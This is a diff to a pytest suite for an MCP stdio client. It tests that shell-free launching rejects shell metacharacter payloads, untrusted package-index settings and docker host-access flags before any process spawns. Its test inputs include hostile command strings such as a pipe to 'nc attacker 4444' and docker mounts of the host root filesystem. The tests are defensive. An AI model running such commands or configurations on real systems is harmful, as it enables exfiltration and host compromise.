@@ -9,6 +9,7 @@ This test suite validates the MCP utility functions including:
 import asyncio
 import os
 import re
+import shlex
 import shutil
 import sys
 from contextlib import suppress
@@ -123,26 +124,15 @@ class TestMCPStdioShellFreeLaunch:
             "node server.js | nc attacker 4444",  # pipe to listener
         ],
     )
-    async def test_shell_metacharacter_payloads_become_literal_argv(self, payload):
-        """Shell metacharacters are inert: with no shell, they are just literal argv tokens.
+    async def test_shell_metacharacter_payloads_are_rejected_before_spawn(self, payload):
+        """The shared API/runtime policy rejects shell syntax even with shell-free launch."""
+        client, get_session = self._client_with_mocked_session()
 
-        Under the old ``bash -c "exec ..."`` wrapper these payloads would chain a
-        second command. With shell=False the launched binary is the real
-        executable and the metacharacters are passed to it verbatim -- there is no
-        shell to interpret ``;``, ``&&``, ``|``, ``$()`` or backticks.
-        """
-        client, _ = self._client_with_mocked_session()
+        with pytest.raises(ValueError, match="dangerous shell metacharacter"):
+            await client._connect_to_server(payload)
 
-        await client._connect_to_server(payload)
-
-        params = client._connection_params
-        # The real binary is launched, never a shell.
-        assert params.command == "node"
-        assert params.command not in _SHELL_INTERPRETERS
-        # The dangerous tokens survive only as literal arguments handed to node,
-        # so they cannot spawn `touch`, `rm`, `nc`, or a substitution subshell.
-        joined = " ".join(params.args)
-        assert any(marker in joined for marker in (";", "&&", "|", "$(", "`"))
+        get_session.assert_not_awaited()
+        assert client._connection_params is None
 
     async def test_bash_func_env_is_rejected_before_any_spawn(self):
         """BASH_FUNC_* (Shellshock-style) env is both inert under shell=False and rejected.
@@ -191,6 +181,79 @@ class TestMCPStdioShellFreeLaunch:
             await client._connect_to_server("python server.py", env=dangerous_env)
 
         get_session.assert_not_awaited()
+
+    @pytest.mark.parametrize(
+        "dangerous_env",
+        [
+            {"NPM_CONFIG_REGISTRY": "https://packages.example.invalid"},
+            {"UV_DEFAULT_INDEX": "https://packages.example.invalid/simple"},
+            {"UV_INDEX_URL": "https://packages.example.invalid/simple"},
+            {"PIP_INDEX_URL": "https://packages.example.invalid/simple"},
+        ],
+    )
+    async def test_package_source_env_is_rejected_before_any_spawn(self, dangerous_env):
+        client, get_session = self._client_with_mocked_session()
+
+        with pytest.raises(ValueError, match="not allowed"):
+            await client._connect_to_server("uvx mcp-server", env=dangerous_env)
+
+        get_session.assert_not_awaited()
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "uvx --default-index https://packages.example.invalid/simple mcp-server",
+            "uvx --from git+https://code.example.invalid/server.git mcp-server",
+            "npx --registry=https://packages.example.invalid @example/mcp-server",
+            "docker run -v /:/host mcp-server",
+            "docker run --mount type=bind,source=/,target=/host mcp-server",
+            "docker run --volumes-from other mcp-server",
+            "docker run --device=/dev/example mcp-server",
+            "docker run --network host mcp-server",
+            "docker run --security-opt seccomp=unconfined mcp-server",
+            "sh -c 'uvx --default-index https://packages.example.invalid/simple mcp-server'",
+        ],
+    )
+    async def test_source_args_and_docker_host_access_are_rejected_before_any_spawn(self, command):
+        client, get_session = self._client_with_mocked_session()
+
+        with pytest.raises(ValueError, match="not allowed"):
+            await client._connect_to_server(command)
+
+        get_session.assert_not_awaited()
+
+    async def test_trusted_uvx_from_and_provider_token_are_preserved(self):
+        client, get_session = self._client_with_mocked_session()
+
+        await client._connect_to_server(
+            "uvx --from lfx lfx-mcp",
+            env={"GITHUB_PERSONAL_ACCESS_TOKEN": "provider-token"},  # pragma: allowlist secret
+        )
+
+        get_session.assert_awaited_once()
+        assert client._connection_params.command == "uvx"
+        assert client._connection_params.args == ["--from", "lfx", "lfx-mcp"]
+        assert client._connection_params.env["GITHUB_PERSONAL_ACCESS_TOKEN"] == "provider-token"  # noqa: S105
+
+    async def test_isolated_docker_args_are_preserved(self):
+        client, get_session = self._client_with_mocked_session()
+
+        await client._connect_to_server(
+            "docker run --rm -i --network bridge --security-opt no-new-privileges mcp-image"
+        )
+
+        get_session.assert_awaited_once()
+        assert client._connection_params.command == "docker"
+        assert client._connection_params.args == [
+            "run",
+            "--rm",
+            "-i",
+            "--network",
+            "bridge",
+            "--security-opt",
+            "no-new-privileges",
+            "mcp-image",
+        ]
 
     async def test_empty_command_is_rejected(self):
         """An empty/whitespace command string raises rather than spawning an empty argv."""
@@ -1014,43 +1077,49 @@ class TestUpdateToolsStdioHeaders:
         assert full_command == "uvx mcp-proxy --transport streamablehttp http://localhost/streamable"
 
     @pytest.mark.asyncio
-    async def test_stdio_multiword_command_with_empty_args(self):
-        """A multi-word command string (e.g. 'uvx mcp-server-fetch') with empty args should be split correctly.
-
-        Regression test: shlex.join(["uvx mcp-server-fetch"]) used to produce
-        a single-quoted token that bash treated as one binary name, causing
-        'exec: uvx mcp-server-fetch: not found'.
-        """
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "uvx mcp-server-fetch",
+            "node -e",
+            "npx\t-y\t@modelcontextprotocol/server-fetch",
+            "/usr/bin/node --version",
+            "C:\\Program Files\\nodejs\\node.exe --version",
+        ],
+    )
+    async def test_stdio_rejects_arguments_embedded_in_command(self, command):
+        """Runtime-loaded configs enforce the same single-executable command boundary."""
         mock_stdio = AsyncMock(spec=MCPStdioClient)
         mock_stdio.connect_to_server.return_value = []
         mock_stdio._connected = True
 
         server_config = {
-            "command": "uvx mcp-server-fetch",
+            "command": command,
             "args": [],
         }
 
-        await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
+        with pytest.raises(ValueError, match="single executable"):
+            await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
 
-        full_command = mock_stdio.connect_to_server.call_args[0][0]
-        assert full_command == "uvx mcp-server-fetch"
+        mock_stdio.connect_to_server.assert_not_called()
 
     @pytest.mark.asyncio
-    async def test_stdio_multiword_command_with_args(self):
-        """A multi-word command string combined with additional args should produce correct tokens."""
+    async def test_stdio_preserves_executable_path_with_spaces(self):
+        """A platform path stays one argv entry while args remain separate."""
         mock_stdio = AsyncMock(spec=MCPStdioClient)
         mock_stdio.connect_to_server.return_value = []
         mock_stdio._connected = True
+        command = "C:\\Program Files\\nodejs\\node.exe"
 
         server_config = {
-            "command": "uvx mcp-server-fetch",
-            "args": ["--timeout", "30"],
+            "command": command,
+            "args": ["server.js", "--timeout", "30"],
         }
 
         await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
 
         full_command = mock_stdio.connect_to_server.call_args[0][0]
-        assert full_command == "uvx mcp-server-fetch --timeout 30"
+        assert shlex.split(full_command) == [command, "server.js", "--timeout", "30"]
 
     @pytest.mark.asyncio
     async def test_stdio_headers_appended_when_all_args_are_flags(self):
@@ -1060,7 +1129,7 @@ class TestUpdateToolsStdioHeaders:
         mock_stdio._connected = True
 
         server_config = {
-            "command": "some-tool",
+            "command": "uvx",
             "args": ["--verbose", "--debug"],
             "headers": {"Authorization": "Bearer tok"},
         }
@@ -1068,7 +1137,7 @@ class TestUpdateToolsStdioHeaders:
         await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
 
         full_command = mock_stdio.connect_to_server.call_args[0][0]
-        assert full_command == "some-tool --verbose --debug --headers authorization 'Bearer tok'"
+        assert full_command == "uvx --verbose --debug --headers authorization 'Bearer tok'"
 
     @pytest.mark.asyncio
     async def test_stdio_headers_appended_when_last_token_is_flag_value(self):
@@ -1078,7 +1147,7 @@ class TestUpdateToolsStdioHeaders:
         mock_stdio._connected = True
 
         server_config = {
-            "command": "some-tool",
+            "command": "uvx",
             "args": ["--port", "8080"],
             "headers": {"Authorization": "Bearer tok"},
         }
@@ -1087,7 +1156,7 @@ class TestUpdateToolsStdioHeaders:
 
         full_command = mock_stdio.connect_to_server.call_args[0][0]
         # 8080 is a value for --port, not a positional arg, so headers go at the end
-        assert full_command == "some-tool --port 8080 --headers authorization 'Bearer tok'"
+        assert full_command == "uvx --port 8080 --headers authorization 'Bearer tok'"
 
     @pytest.mark.asyncio
     async def test_stdio_headers_inserted_before_positional_with_flag_value_pairs(self):
@@ -1194,7 +1263,7 @@ class TestUpdateToolsPerToolResilience:
         ):
             mode, tool_list, tool_cache = await update_tools(
                 server_name="linear-like",
-                server_config={"command": "fake-cmd", "args": []},
+                server_config={"command": "uvx", "args": []},
                 mcp_stdio_client=mock_stdio,
             )
 
@@ -1244,7 +1313,7 @@ class TestUpdateToolsPerToolResilience:
         with patch("lfx.base.mcp.util.create_input_schema_from_json_schema", side_effect=selective_converter):
             _, tool_list, tool_cache = await update_tools(
                 server_name="stress",
-                server_config={"command": "fake-cmd", "args": []},
+                server_config={"command": "uvx", "args": []},
                 mcp_stdio_client=mock_stdio,
             )
 
@@ -2047,7 +2116,7 @@ class TestMCPUtilityFunctions:
     async def test_validate_connection_params(self):
         """Test connection parameter validation."""
         # Valid parameters
-        await util._validate_connection_params("Stdio", command="echo test")
+        await util._validate_connection_params("Stdio", command="echo")
         await util._validate_connection_params("SSE", url="http://test")
 
         # Invalid parameters
@@ -3769,7 +3838,7 @@ class TestMCPStructuredToolToolCallId:
         mock_client.run_tool = AsyncMock(return_value=raw_result)
         mock_client._connected = True
 
-        server_config = {"command": "fake-server"}
+        server_config = {"command": "uvx"}
         _, tools, _ = await update_tools("test-server", server_config, mcp_stdio_client=mock_client)
         assert tools, "update_tools() must return at least one tool"
         return tools[0]
